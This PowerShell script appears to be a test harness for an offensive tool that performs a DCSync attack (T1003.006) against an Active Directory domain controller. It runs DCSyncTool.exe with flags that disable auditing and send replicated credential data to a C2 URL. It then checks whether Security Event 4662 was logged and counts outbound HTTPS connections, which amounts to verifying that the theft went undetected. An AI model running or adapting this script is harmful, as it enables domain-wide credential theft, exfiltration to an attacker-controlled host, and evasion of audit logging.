# run_test.ps1 — Plan 3: DCSync via DRSUAPI Test
param(
    [switch]$LocalOnly,
    [string]$C2Url,
    [string]$OutputDir = ".\output"
)

$TOOL = "..\DCSyncTool.exe"
$DOMAIN = (Get-WmiObject Win32_ComputerSystem).Domain
$LOG = Join-Path $OutputDir "dcsync_test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null }

function Log($m) { "$(Get-Date -Format 'HH:mm:ss.fff') $m" | Tee-Object $LOG -Append }

Log "=" * 70
Log "  Plan 3: DCSync via DRSUAPI Test"
Log "  Target: T1003.006 — DsGetNCChanges + C2 Exfil"
Log "=" * 70
Log ""

# ─── Environment ───
Log ">>> ENVIRONMENT <<<"
Log "Domain: $DOMAIN"
$dc = (Get-ADDomainController -Discover -ErrorAction SilentlyContinue).HostName
if ($dc) { Log "DC: $dc" }
Log "Current User: $env:USERDOMAIN\$env:USERNAME"
Log ""

# ─── Privilege check ───
Log ">>> PRIVILEGE <<<"
try {
    $dn = whoami /fqdn 2>&1
    Log "DN: $dn"
    $groups = net group "Domain Admins" $env:USERNAME /domain 2>&1
    if ($LASTEXITCODE -eq 0) { Log "DA: YES" } else { Log "DA: NO" }
} catch { Log "Cannot verify DA membership" }
Log ""

# ─── Run DCSync ───
Log ">>> DCSYNC EXECUTION <<<"
$args = @("--dcsync", $DOMAIN, "--output-json", "--disable-audit")
if ($C2Url) { $args += "--output-c2", $C2Url; Log "C2: $C2Url" }
if ($LocalOnly) { $args += "--max-objects", "10"; Log "Test mode: 10 objects max" }

$sw = [Diagnostics.Stopwatch]::StartNew()
Log "Running: $TOOL $args"
$result = & $TOOL $args 2>&1
$sw.Stop()
foreach ($line in $result) { Log $line }
Log "Duration: $($sw.Elapsed.TotalSeconds.ToString('F2'))s | Exit: $LASTEXITCODE"
Log ""

# ─── Audit verification ───
Log ">>> AUDIT VERIFICATION <<<"
try {
    $evt4662 = Get-WinEvent -LogName Security -MaxEvents 100 -EA Stop |
        Where-Object { $_.Id -eq 4662 -and $_.TimeCreated -gt (Get-Date).AddMinutes(-10) }
    if ($evt4662) {
        Log "WARNING: Event 4662 (DS Access) detected! ($($evt4662.Count) instances)"
        foreach ($e in $evt4662) {
            Log "  $($e.TimeCreated): $($e.Properties[1].Value)"
        }
    } else {
        Log "No Event 4662 detected (audit disabled or not triggered)"
    }
} catch { Log "Security log not accessible" }
Log ""

# ─── Network check (if C2 used) ───
if ($C2Url) {
    Log ">>> C2 NETWORK CHECK <<<"
    try {
        $conns = Get-NetTCPConnection -State Established -EA Stop |
            Where-Object { $_.RemotePort -eq 443 }
        Log "Active HTTPS connections: $($conns.Count)"
    } catch { Log "Cannot enumerate connections" }
}

Log "=" * 70
Log "  TEST COMPLETE"
Log "=" * 70
